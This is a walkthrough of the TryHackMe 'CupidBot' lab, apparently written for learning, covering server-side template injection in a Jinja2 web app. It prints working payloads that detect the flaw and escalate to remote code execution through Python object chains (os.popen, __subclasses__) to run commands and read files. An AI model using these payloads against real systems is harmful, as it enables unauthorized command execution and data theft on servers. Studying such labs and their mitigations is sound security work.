# 💘 CupidBot — TryHackMe Walkthrough

**Room:** [CupidBot](https://tryhackme.com/room/cupidbot)
**Difficulty:** Easy
**Category:** Web / SSTI / Injection
**Tags:** SSTI, Server-Side Template Injection, Jinja2, Python, RCE

---

## 📋 Overview

CupidBot is a web challenge centred on **Server-Side Template Injection (SSTI)** — a vulnerability where user input is embedded directly into a server-side template, allowing code execution. The application is a chatbot or web form powered by a Python/Jinja2 template engine.

---

## 🔧 Tools Used

- Browser / Burp Suite — Input testing
- Python knowledge — Understanding Jinja2 SSTI payloads

---

## 🌐 Step 1: Identify the Template Engine

Navigate to `http://<TARGET_IP>` and interact with the input form. Test for SSTI by injecting a mathematical expression:

```
{{7*7}}
```

If the output shows `49`, the server is evaluating your input as a template expression — SSTI is confirmed. The `{{}}` syntax indicates **Jinja2** (Python).

---

## 🔍 Step 2: Fingerprint the Engine

Further fingerprint with:

```
${7*7}      → FreeMarker/Smarty (output: 49)
{{7*'7'}}   → Jinja2 (output: 7777777)
<%= 7*7 %>  → ERB/Ruby
```

---

## 💉 Step 3: Exploit SSTI for RCE

With Jinja2 confirmed, escalate to RCE using Python's object chain:

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

Or with `__builtins__`:

```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0].strip() }}
```

Simpler payload for reading files:

```python
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

---

## 🚩 Step 4: Read the Flag

Once RCE is achieved, read the flag:

```python
{{config.__class__.__init__.__globals__['os'].popen('cat /flag.txt').read()}}
```

Or find the flag first:

```python
{{config.__class__.__init__.__globals__['os'].popen('find / -name flag* 2>/dev/null').read()}}
```

> 🚩 **Flag:** Extracted via SSTI/RCE by reading the flag file from the server.

---

## 📝 Key Takeaways

- **SSTI** is highly dangerous — it can lead directly to RCE and full server compromise.
- It differs from XSS: SSTI is evaluated server-side, XSS is evaluated client-side.
- Common vulnerable template engines: Jinja2 (Python), Twig (PHP), Freemarker (Java), Pebble.
- Mitigations: never render user input inside templates; use sandboxed template environments.

---

## 🔗 References

- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [TryHackMe — CupidBot Room](https://tryhackme.com/room/cupidbot)
- [Walkthrough Reference](https://0x77zen.medium.com/cupidbot-thm-7fa6fccfb357)
